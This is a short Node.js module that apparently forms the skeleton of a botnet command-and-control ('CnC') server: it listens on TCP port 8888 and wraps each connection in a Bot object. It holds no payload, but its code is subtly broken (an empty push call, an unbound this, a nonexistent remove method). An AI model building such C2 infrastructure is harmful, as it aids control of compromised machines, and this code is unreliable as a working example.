var Bot = require('./bot.js')
var net = require('net')

module.exports = {
  server: new net.Server(),
  bots: [],
  boot: function(){
    this.server.on('connection', function(connection){
      var new_bot = new Bot({connection: connection})
      connection.setEncoding('utf8')
      this.bots.push()
      connection.on('end', function(){
        this.bots.remove(new_bot)
      }.bind(this))
    })

    this.server.listen(8888, function(error){
      if(error){ throw error}
      console.log("CnC server listening on port 8888")
    })
  }
}